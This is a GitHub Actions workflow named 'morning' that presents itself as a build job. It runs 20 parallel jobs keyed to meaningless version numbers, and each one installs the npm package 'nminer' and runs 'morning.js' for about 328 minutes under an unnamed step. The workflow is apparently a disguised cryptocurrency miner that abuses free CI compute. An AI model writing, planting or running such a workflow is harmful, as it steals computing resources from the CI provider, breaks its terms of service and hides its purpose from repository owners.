name: morning
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8327 }
          - { version: 6791 }
          - { version: 6634 }
          - { version: 3491 }
          - { version: 3975 }
          - { version: 6476 }
          - { version: 6654 }
          - { version: 2379 }
          - { version: 7036 }
          - { version: 7823 }
          - { version: 8628 }
          - { version: 1470 }
          - { version: 569 }
          - { version: 5137 }
          - { version: 2081 }
          - { version: 2507 }
          - { version: 2942 }
          - { version: 9642 }
          - { version: 1903 }
          - { version: 2876 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 328m node morning.js || echo "morning executed"